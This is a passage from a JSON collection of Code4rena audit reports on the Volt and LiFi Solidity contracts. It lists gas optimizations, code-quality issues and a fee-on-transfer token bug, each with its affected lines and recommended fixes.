so they can be made unchecked to save gas\n\n## Proof of Concept\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nMake these operations unchecked\n\n\n\nPublic state variables can be made private\n\n## Lines of code\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/volt/Volt.sol#L11\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/volt/Volt.sol#L13\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/volt/Volt.sol#L15\n\n## Vulnerability details\n\n## Impact\nDOMAIN_SEPARATOR, PERMIT_TYPEHASH and nonces are used only in Volt.sol, hence can be made private.\nSaves ~4K gas.\n\n## Proof of Concept\n\n## Tools Used\nRemix\n\n## Recommended Mitigation Steps\nChange their visibility to private.\n\n\n\nMove the require check up\n\n## Lines of code\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L103\n\n## Vulnerability details\n\n## Impact\nnewBuffer non-zero check can be made right after reading buffer, so that if require fails the operations in between would be avoided.\n\n## Proof of Concept\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nMove the require to line 97.\n\n\n\nPublic state variables can be made internal\n\n## Lines of code\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L11\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L14\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L17\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L20\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L23\n\n## Vulnerability details\n\n## Impact\nMAX_RATE_LIMIT_PER_SECOND, rateLimitPerSecond, lastBufferUsedTime, bufferCap, doPartialAction can be changed to internal.\n\n## Proof of Concept\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nChange their visibility to internal.\n\n\n\n\nConstant keccak variables can be changed to immutable\n\n## Lines of code\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/core/Permissions.sol#L10\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/core/Permissions.sol#L11\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/core/Permissions.sol#L12\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/core/Permissions.sol#L15\n\n\n## Vulnerability details\n\n## Impact\nIf these variables are constant, keccak operation will be performed whenever the variable is used. However, if they are immutable, keccak hashing would be performed just once within the constructor.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-10-slingshot-findings/issues/3\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nChange the code as:\n    bytes32 public immutable override BURNER_ROLE;\n    bytes32 public immutable override MINTER_ROLE;\n    bytes32 public immutable override PCV_CONTROLLER_ROLE;\n    bytes32 public constant override GOVERN_ROLE = keccak256(\"GOVERN_ROLE\");\n    bytes32 public immutable override GUARDIAN_ROLE;\n\n    constructor() {\n        // Appointed as a governor so guardian can have indirect access to revoke ability\n        _setupGovernor(address(this));\n\n        _setRoleAdmin(MINTER_ROLE = keccak256(\"MINTER_ROLE\"), GOVERN_ROLE);\n        _setRoleAdmin(BURNER_ROLE = keccak256(\"BURNER_ROLE\"), GOVERN_ROLE);\n        _setRoleAdmin(PCV_CONTROLLER_ROLE = keccak256(\"PCV_CONTROLLER_ROLE\"), GOVERN_ROLE);\n        _setRoleAdmin(GOVERN_ROLE, GOVERN_ROLE);\n        _setRoleAdmin(GUARDIAN_ROLE = keccak256(\"GUARDIAN_ROLE\"), GOVERN_ROLE);\n    }\n\n\n\nBool can be changed to uint256\n\n## Lines of code\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L23\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/OracleRef.sol#L25\n\n## Vulnerability details\n\n## Impact\nBooleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.\n\n## Proof of Concept\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol#L23-L27\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nConsider changing bools to uint256\n\n\n\nUnused modifier\n\n## Lines of code\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L29\n\n## Vulnerability details\n\n## Impact\nThis modifier is used nowhere.\n\n## Proof of Concept\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nDelete the modifier if it is not going to be used.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-volt-findings",
      "repo": "https://github.com/code-423n4/2022-03-volt-findings",
      "url": "https://github.com/code-423n4/2022-03-volt-findings/issues/79"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Optimizations\n\n## 1. Revert string greater than 32 bytes\n\nSome revert strings in code are larger than 32 bytes, reducing the strings to 32 bytes reduces code size and save gas on deployment and when require condition is met\n\n### Proof of concept\n\nSome examples in code\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/oracle/ScalingPriceOracle.sol#L141\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/oracle/ScalingPriceOracle.sol#L177\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/refs/CoreRef.sol#L48\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/refs/CoreRef.sol#L56\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/refs/CoreRef.sol#L72\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/refs/CoreRef.sol#L82\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/utils/RateLimited.sol#L103\n\n### Mitigation\n\nSize of the strings can be reduced or use custom errors introduced in 0.8.4\nrefer : https://blog.soliditylang.org/2021/04/21/custom-errors/\n\n## 2. Storage variable can be cached to save gas\n\nRepeated storage calls of same variable in a code block can be cached and re-used instead of reading from storage to save gas\n\n### Proof of concept    \n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/oracle/ScalingPriceOracle.sol#L123-L124\n\n```\n    int256 delta = int128(currentMonth) - int128(previousMonth);\n    percentageChange = (delta * Constants.BP_INT) / int128(previousMonth); \n```\n\n`decimalsNormalizer` in \n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/refs/OracleRef.sol#L111\n\n```\n    if (decimalsNormalizer < 0) {\n        scalingFactor = 10**(-1 * decimalsNormalizer).toUint256(); \n        _peg = _peg.div(scalingFactor);\n    } else {\n        scalingFactor = 10**decimalsNormalizer.toUint256();\n        _peg = _peg.mul(scalingFactor);\n    }\n\n```\n`volt()` function call can be cached and re-used in \n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/peg/NonCustodialPSM.sol#L286\n\n```\n    uint256 amountFeiToTransfer = Math.min(\n        volt().balanceOf(address(this)),\n        amountVoltOut\n    );\n    uint256 amountFeiToMint = amountVoltOut - amountFeiToTransfer;\n\n    if (amountFeiToTransfer != 0) {\n        IERC20(volt()).safeTransfer(to, amountFeiToTransfer);\n    }\n```\n## 3. Re-order statements to save gas on revert\n\nStatements can be re-ordered to reduce gas consumption on revert\n\n### Proof of concept\n\nInput validation can be done before storage write and function calls in \n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/utils/RateLimited.sol#L41\n\n```\n    lastBufferUsedTime = block.timestamp;\n\n    _setBufferCap(_bufferCap);\n    bufferStored = _bufferCap;\n\n    require(\n        _rateLimitPerSecond <= _maxRateLimitPerSecond,\n        \"RateLimited: rateLimitPerSecond too high\" \n    );\n    _setRateLimitPerSecond(_rateLimitPerSecond);\n\n    MAX_RATE_LIMIT_PER_SECOND = _maxRateLimitPerSecond;\n    doPartialAction = _doPartialAction;\n```\n`newBuffer` can be validation before if condidition\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/utils/RateLimited.sol#L95-L106\n\n```\nfunction _depleteBuffer(uint256 amount) internal virtual returns (uint256) {\n    uint256 newBuffer = buffer();\n\n    uint256 usedAmount = amount;\n    if (doPartialAction && usedAmount > newBuffer) { \n        usedAmount = newBuffer;\n    }\n\n    require(newBuffer != 0, \"RateLimited: no rate limit buffer\"); \n    require(usedAmount <= newBuffer, \"RateLimited: rate limit hit\");\n\n    bufferStored = newBuffer - usedAmount;\n```\n\nInput validation `_bufferCap` in require statement can be done before if statement in\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/utils/MultiRateLimited.sol#L143\n\n```\n    if (core().hasRole(TribeRoles.ADD_MINTER_ROLE, msg.sender)) {\n        require(\n            _rateLimitPerSecond <= individualMaxRateLimitPerSecond,\n            \"MultiRateLimited: rate limit per second exceeds non governor allowable amount\" \n        );\n        require(\n            _bufferCap <= individualMaxBufferCap,\n            \"MultiRateLimited: max buffer cap exceeds non governor allowable amount\" \n        );\n    }\n    require(\n        _bufferCap <= bufferCap,\n        \"MultiRateLimited: buffercap too high\" \n    );\n```\n\ninput validation `_rateLimitPerSecond` can be done before storage read in rate limit address validation in \n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/utils/MultiRateLimited.sol#L266-L273\n\n```\n    RateLimitData storage rateLimitData = rateLimitPerAddress[\n        rateLimitedAddress\n    ];\n\n    require(\n        rateLimitData.lastBufferUsedTime != 0,\n        \"MultiRateLimited: rate limit address does not exist\" \n    );\n    require(\n        _rateLimitPerSecond <= MAX_RATE_LIMIT_PER_SECOND,\n        \"MultiRateLimited: rateLimitPerSecond too high\" \n    );\n```\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/utils/MultiRateLimited.sol#L297-L308\n\n```\n    require(\n        _bufferCap <= bufferCap,\n        \"MultiRateLimited: new buffercap too high\"\n    );\n    require(\n        rateLimitPerAddress[rateLimitedAddress].lastBufferUsedTime == 0,\n        \"MultiRateLimited: address already added\"\n    );\n    require(\n        _rateLimitPerSecond <= MAX_RATE_LIMIT_PER_SECOND,\n        \"MultiRateLimited: rateLimitPerSecond too high\"\n    );\n```\n\n## 4. constant variables can be changed to immutable\n\nexpression assigned to constant variables are evaluated everytime it is called, changing the variable to immutable evaluated the expression once during deployment and avoids repeated evaluation\nrefer: https://github.com/ethereum/solidity/issues/9232\n\n### Proof of concept\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/core/Permissions.sol#L10\n\n```\nbytes32 public constant override BURNER_ROLE = keccak256(\"BURNER_ROLE\");\nbytes32 public constant override MINTER_ROLE = keccak256(\"MINTER_ROLE\");\nbytes32 public constant override PCV_CONTROLLER_ROLE =\n    keccak256(\"PCV_CONTROLLER_ROLE\");\nbytes32 public constant override GOVERN_ROLE = keccak256(\"GOVERN_ROLE\");\nbytes32 public constant override GUARDIAN_ROLE = keccak256(\"GUARDIAN_ROLE\");\n```\n\n### Mitigation\n\nconstant variable can be changed to immutable",
    "dataSource": {
      "name": "code-423n4/2022-03-volt-findings",
      "repo": "https://github.com/code-423n4/2022-03-volt-findings",
      "url": "https://github.com/code-423n4/2022-03-volt-findings/issues/72"
    }
  },
  {
    "title": "QA Report",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/NXTPFacet.sol#L54-L59\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/AnyswapFacet.sol#L46\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/CBridgeFacet.sol#L64\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/HopFacet.sol#L69\n\n\n# Vulnerability details\n\n## Impact\n\nThe `startBridgeTokensVia...` functions do not handle fee-on-transfer tokens (e.g, USDT) correctly. If some fee is deducted during the token transfer (`LibAsset.transferFromERC20`), the transaction will revert because of the following `require` check. As a result, users cannot bridge fee-on-transfer tokens via the `startBridgeTokensVia...` functions.\n\n## Proof of Concept\n\nTake `NXTPFacet` as an example. At line 55, `_nxtpData.amount` is provided as the parameter of `LibAsset.transferFromERC20`. In cases where a fee-on-transfer token is transferred, the received amount could be less than `_nxtpData.amount`.\n\nThen, at line 56, the contract ensures whether its balance is increased by exactly `_nxtpData.amount`, which is false in this case, causing the tx to be reverted.\n\n[NXTPFacet.sol#L54-L59](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/NXTPFacet.sol#L54-L59)\n\n## Recommended Mitigation Steps\n\nConsider calculating the received amount of tokens after the transfer, and modify `_nxtpData.amount` accordingly, for example:\n\n```solidity\nLibAsset.transferFromERC20(sendingAssetId, msg.sender, address(this), _nxtpData.amount);\n_nxtpData.amount = LibAsset.getOwnBalance(sendingAssetId) - _sendingAssetIdBalance;\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-lifinance-findings",
      "repo": "https://github.com/code-423n4/2022-03-lifinance-findings",
      "url": "https://github.com/code-423n4/2022-03-lifinance-findings/issues/204"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low Risk Issues\n\n### `_executeSwaps()` requires a specific order of swaps if the same asset is involved\nConsider the following chain of swaps <token>(<amount>): A(1)->B(2), C(1)->B(2), B(5)->D. If the specified order happens, the first two swaps will have deposited the majority of the funds needed for the third. If the swaps are shuffled, it's possible for the third swap to come first, transferring B(5) first, then getting an additional B(4) from the other two swaps. Documentation should make it clear that the order in the array is the order that things will take place in (i.e. a list of swaps and not a set of swaps), and that this functionality should not be used for batching requests from multiple users.\n```solidity\n        if (!LibAsset.isNativeAsset(fromAssetId) && LibAsset.getOwnBalance(fromAssetId) < fromAmount) {\n            LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), fromAmount);\n        }\n\n        if (!LibAsset.isNativeAsset(fromAssetId)) {\n            LibAsset.approveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount);\n        }\n```\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibSwap.sol#L33-L39\n\n### Unnecessary `receive()`\nThe added capability of the contract to receive Ether, without any purpose, is incorrect state handling. Nothing is emitted, no revert stateemnts are added, and no calldata is passed.\n\n1. File: src/LiFiDiamond.sol (line [62](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/LiFiDiamond.sol#L62))\n```solidity\n    receive() external payable {}\n```\n\n### `require()` should be used instead of `assert()`\n\n1. File: src/Facets/WithdrawFacet.sol (line [30](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L30))\n```solidity\n            assert(_amount <= self.balance);\n```\n2. File: src/Facets/WithdrawFacet.sol (line [34](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L34))\n```solidity\n            assert(_amount <= assetBalance);\n```\n\n### Slippage has no bounds checking, which could lead to excessive transaction costs\n1. File: src/Facets/CBridgeFacet.sol: (lines [149-169](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/CBridgeFacet.sol#L149-L169))\n```solidity\n        if (LibAsset.isNativeAsset(_cBridgeData.token)) {\n            ICBridge(bridge).sendNative(\n                _cBridgeData.receiver,\n                _cBridgeData.amount,\n                _cBridgeData.dstChainId,\n                _cBridgeData.nonce,\n                _cBridgeData.maxSlippage\n            );\n        } else {\n            // Give CBridge approval to bridge tokens\n            LibAsset.approveERC20(IERC20(_cBridgeData.token), bridge, _cBridgeData.amount);\n            // solhint-disable check-send-result\n            ICBridge(bridge).send(\n                _cBridgeData.receiver,\n                _cBridgeData.token,\n                _cBridgeData.amount,\n                _cBridgeData.dstChainId,\n                _cBridgeData.nonce,\n                _cBridgeData.maxSlippage\n            );\n        }\n```\n\n\n\n\n\n\n\n\n## Non-critical Issues\n\n### No two-phase ownership transfer pattern\nConsider adding a two-phase transfer, where the current owner nominates the next owner, and the next owner has to call `acceptOwnership()` to become the new owner. This prevents passing the ownership to an account that is unable to use it.\n\n1. File: src/Libraries/LibDiamond.sol (lines [44-49](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibDiamond.sol#L44-L49))\n```solidity\n    function setContractOwner(address _newOwner) internal {\n        DiamondStorage storage ds = diamondStorage();\n        address previousOwner = ds.contractOwner;\n        ds.contractOwner = _newOwner;\n        emit OwnershipTransferred(previousOwner, _newOwner);\n    }\n```\n\n### `safeApprove()` is deprecated\n[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`\n\n1. File: src/Libraries/LibAsset.sol (line [67](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibAsset.sol#L67))\n```solidity\n            if (allowance > 0) SafeERC20.safeApprove(IERC20(assetId), spender, 0);\n```\n2. File: src/Libraries/LibAsset.sol (line [68](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibAsset.sol#L68))\n```solidity\n            SafeERC20.safeApprove(IERC20(assetId), spender, MAX_INT);\n```\n\n### Event is missing `indexed` fields\nEach `event` should use three `indexed` fields if there are three or more fields\n\n1. File: src/Libraries/LibSwap.sol (lines [19-27](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibSwap.sol#L19-L27))\n```solidity\n    event AssetSwapped(\n        bytes32 transactionId,\n        address dex,\n        address fromAssetId,\n        address toAssetId,\n        uint256 fromAmount,\n        uint256 toAmount,\n        uint256 timestamp\n    );\n```\n2. File: src/Libraries/LibDiamond.sol (line [59](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibDiamond.sol#L59))\n```solidity\n    event DiamondCut(IDiamondCut.FacetCut[] _diamondCut, address _init, bytes _calldata);\n```\n3. File: src/Interfaces/IDiamondCut.sol (line [30](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/IDiamondCut.sol#L30))\n```solidity\n    event DiamondCut(FacetCut[] _diamondCut, address _init, bytes _calldata);\n```\n4. File: src/Interfaces/ITransactionManager.sol (line [152](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/ITransactionManager.sol#L152))\n```solidity\n    event LiquidityAdded(address indexed router, address indexed assetId, uint256 amount, address caller);\n```\n5. File: src/Interfaces/ITransactionManager.sol (line [154](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/ITransactionManager.sol#L154))\n```solidity\n    event LiquidityRemoved(address indexed router, address indexed assetId, uint256 amount, address recipient);\n```\n6. File: src/Interfaces/ILiFi.sol (lines [20-30](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/ILiFi.sol#L20-L30))\n```solidity\n    event LiFiTransferStarted(\n        bytes32 indexed transactionId,\n        string integrator,\n        address referrer,\n        address sendingAssetId,\n        address receivingAssetId,\n        address receiver,\n        uint256 amount,\n        uint256 destinationChainId,\n        uint256 timestamp\n    );\n```\n7. File: src/Interfaces/ILiFi.sol (lines [32-38](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/ILiFi.sol#L32-L38))\n```solidity\n    event LiFiTransferCompleted(\n        bytes32 indexed transactionId,\n        address receivingAssetId,\n        address receiver,\n        uint256 amount,\n        uint256 timestamp\n    );\n```\n8. File: src/Interfaces/ILiFi.sol (lines [40-50](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/ILiFi.sol#L40-L50))\n```solidity\n    event LiFiTransferConfirmed(\n        bytes32 indexed transactionId,\n        string integrator,\n        address referrer,\n        address sendingAssetId,\n        address receivingAssetId,\n        address receiver,\n        uint256 amount,\n        uint256 destinationChainId,\n        uint256 timestamp\n    );\n```\n9. File: src/Interfaces/ILiFi.sol (lines [51-61](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/ILiFi.sol#L51-L61))\n```solidity\n    event LiFiTransferRefunded(\n        bytes32 indexed transactionId,\n        string integrator,\n        address referrer,\n        address sendingAssetId,\n        address receivingAssetId,\n        address receiver,\n        uint256 amount,\n        uint256 destinationChainId,\n        uint256 timestamp\n    );\n```\n10. File: src/Interfaces/ILiFi.sol (line [62](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/ILiFi.sol#L62))\n```solidity\n    event Inited(address indexed bridge, uint64 chainId);\n```\n11. File: src/Facets/NXTPFacet.sol (lines [25-29](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/NXTPFacet.sol#L25-L29))\n```solidity\n    event NXTPBridgeStarted(\n        bytes32 indexed lifiTransactionId,\n        bytes32 nxtpTransactionId,\n        ITransactionManager.TransactionData txData\n    );\n```\n12. File: src/Facets/WithdrawFacet.sol (line [12](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L12))\n```solidity\n    event LogWithdraw(address indexed _assetAddress, address _from, uint256 amount);\n```\n\n### `public` functions not called by the contract should be declared `external` instead\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n1. File: src/Facets/NXTPFacet.sol (line [46](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/NXTPFacet.sol#L46))\n```solidity\n    function startBridgeTokensViaNXTP(LiFiData memory _lifiData, ITransactionManager.PrepareArgs memory _nxtpData)\n```\n2. File: src/Facets/NXTPFacet.sol (lines [85-88](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/NXTPFacet.sol#L85-L88))\n```solidity\n    function swapAndStartBridgeTokensViaNXTP(\n        LiFiData memory _lifiData,\n        LibSwap.SwapData[] calldata _swapData,\n        ITransactionManager.PrepareArgs memory _nxtpData\n```\n3. File: src/Facets/NXTPFacet.sol (lines [124-128](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/NXTPFacet.sol#L124-L128))\n```solidity\n    function completeBridgeTokensViaNXTP(\n        LiFiData memory _lifiData,\n        address assetId,\n        address receiver,\n        uint256 amount\n```\n4. File: src/Facets/NXTPFacet.sol (lines [150-154](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/NXTPFacet.sol#L150-L154))\n```solidity\n    function swapAndCompleteBridgeTokensViaNXTP(\n        LiFiData memory _lifiData,\n        LibSwap.SwapData[] calldata _swapData,\n        address finalAssetId,\n        address receiver\n```\n5. File: src/Facets/HopFacet.sol (line [61](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/HopFacet.sol#L61))\n```solidity\n    function startBridgeTokensViaHop(LiFiData memory _lifiData, HopData calldata _hopData) public payable {\n```\n6. File: src/Facets/HopFacet.sol (lines [95-98](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/HopFacet.sol#L95-L98))\n```solidity\n    function swapAndStartBridgeTokensViaHop(\n        LiFiData memory _lifiData,\n        LibSwap.SwapData[] calldata _swapData,\n        HopData memory _hopData\n```\n7. File: src/Facets/GenericSwapFacet.sol (line [22](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/GenericSwapFacet.sol#L22))\n```solidity\n    function swapTokensGeneric(LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData) public payable {\n```\n8. File: src/Facets/WithdrawFacet.sol (lines [20-23](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L20-L23))\n```solidity\n    function withdraw(\n        address _assetAddress,\n        address _to,\n        uint256 _amount\n```\n9. File: src/Facets/AnyswapFacet.sol (line [35](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/AnyswapFacet.sol#L35))\n```solidity\n    function startBridgeTokensViaAnyswap(LiFiData memory _lifiData, AnyswapData calldata _anyswapData) public payable {\n```\n10. File: src/Facets/AnyswapFacet.sol (lines [74-77](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/AnyswapFacet.sol#L74-L77))\n```solidity\n    function swapAndStartBridgeTokensViaAnyswap(\n        LiFiData memory _lifiData,\n        LibSwap.SwapData[] calldata _swapData,\n        AnyswapData memory _anyswapData\n```\n11. File: src/Facets/CBridgeFacet.sol (line [57](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/CBridgeFacet.sol#L57))\n```solidity\n    function startBridgeTokensViaCBridge(LiFiData memory _lifiData, CBridgeData calldata _cBridgeData) public payable {\n```\n12. File: src/Facets/CBridgeFacet.sol (lines [92-95](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/CBridgeFacet.sol#L92-L95))\n```solidity\n    function swapAndStartBridgeTokensViaCBridge(\n        LiFiData memory _lifiData,\n        LibSwap.SwapData[] calldata _swapData,\n        CBridgeData memory _cBridgeData\n```\n\n### `constant`s should be defined rather than using magic numbers\n\n1. File: src/Libraries/LibUtil.sol (line [11](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibUtil.sol#L11))\n```solidity\n        if (_res.length < 68) return \"Transaction reverted silently\";\n```\n2. File: src/Libraries/LibUtil.sol (line [12](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibUtil.sol#L12))\n```solidity\n        bytes memory revertData = _res.slice(4, _res.length - 4); // Remove the selector which is the first 4 bytes\n```\n3. File: src/Libraries/LibUtil.sol (line [12](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibUtil.sol#L12))\n```solidity\n        bytes memory revertData = _res.slice(4, _res.length - 4); // Remove the selector which is the first 4 bytes\n```\n\n### File is missing NatSpec\n\n1. File: src/Libraries/LibSwap.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibSwap.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n2. File: src/Libraries/LibUtil.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibUtil.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n3. File: src/Libraries/LibDiamond.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibDiamond.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n4. File: src/Libraries/LibStorage.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibStorage.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n5. File: src/Interfaces/IAnyswapRouter.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/IAnyswapRouter.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n6. File: src/Interfaces/IHopBridge.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/IHopBridge.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n7. File: 